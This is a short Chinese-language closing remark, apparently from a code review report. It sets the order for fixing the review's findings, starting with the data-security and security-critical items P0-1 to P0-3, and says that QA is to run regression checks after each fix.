> 备注：以上均基于真实代码定位，行号以审查当日源码为准。修复阶段建议从 P0-1 开始（数据安全最高优先），随后 P0-2/P0-3（安全红线），再按表格顺序推进；每个修复完成后由 QA（任务 #2）做回归验证。
